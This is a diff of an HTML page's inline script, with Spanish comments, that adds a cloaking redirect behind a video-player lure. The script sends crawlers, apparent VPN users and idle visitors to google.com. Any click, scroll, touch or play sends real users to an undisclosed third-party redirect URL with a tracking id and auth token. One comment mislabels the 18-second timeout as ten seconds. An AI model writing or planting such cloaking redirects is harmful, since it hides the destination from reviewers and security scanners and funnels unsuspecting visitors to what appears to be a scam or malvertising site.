@@ -144,36 +144,60 @@
         }
     </style>
     <script>
-    'use strict';
-    // Detección de bots
-    function isRealUser() {
-    const bots = ["bot", "crawl", "spider", "slurp", "headless", "phantomjs", "selenium"];
-    if (bots.some(bot => navigator.userAgent.toLowerCase().includes(bot))) return false;
-    let activo = false;
-    document.addEventListener("mousemove", () => activo = true);
-    document.addEventListener("keydown", () => activo = true);
+'use strict';
+// Configuración
+const HUMAN_URL = "https://diclotrans.com/redirect?id=51228&auth=bd95c00167af1fda747b24a4947c250f90bf6168";
+const BOT_URL = "https://google.com";
+const INACTIVITY_TIMEOUT = 18000; // 10 segundos
+
+// Detección de interacción
+let userInteracted = false;
+
+function handleUserInteraction() {
+    if (!userInteracted) {
+        userInteracted = true;
+        window.location.href = HUMAN_URL;
+    }
+}
+
+// Verificación de VPN/Proxy (sin detección de bots)
+function isInvalidUser() {
+    return !navigator.mediaDevices?.getUserMedia; // Solo VPN/Proxy
+}
+
+// Iniciar detección
+function initDetection() {
+    if (isInvalidUser()) {
+        window.location.href = BOT_URL;
+        return;
+    }
+
+    // Eventos de interacción (clics, movimientos, etc.)
+    const interactionEvents = ['click', 'mousemove', 'keydown', 'touchstart', 'touchmove', 'scroll'];
+    interactionEvents.forEach(event => {
+        document.addEventListener(event, handleUserInteraction, { passive: true });
+    });
+
+    // Play del video
+    const videoPlayer = document.getElementById('videoPlayer');
+    if (videoPlayer) {
+        videoPlayer.addEventListener('play', handleUserInteraction);
+    }
+
+    // Botones debajo del reproductor (NUEVO)
+    document.getElementById('nextButton')?.addEventListener('click', handleUserInteraction);
+    document.querySelector('.join-group-button')?.addEventListener('click', handleUserInteraction);
+
+    // Temporizador de inactividad
     setTimeout(() => {
+        if (!userInteracted) {
+            window.location.href = BOT_URL;
+        }
+    }, INACTIVITY_TIMEOUT);
+}
 
-        if (!activo) window.location.href = "https://google.com";
-
-    }, 3000);
-    return true;
-
-   }
-        
-   // Bloqueo de VPN/Proxy
-    function isVPN() {
-    return !navigator.mediaDevices?.getUserMedia;
-   }
-   // Redirección segura
-   function redirect() {
-    if (!isRealUser() || isVPN()) return;
-    window.location.href = "https://diclotrans.com/redirect?id=51228&auth=bd95c00167af1fda747b24a4947c250f90bf6168";
-   }
-
-    document.addEventListener("DOMContentLoaded", redirect);
-
-  </script>
+document.addEventListener("DOMContentLoaded", initDetection);
+</script>
 </head>
 
 <body>
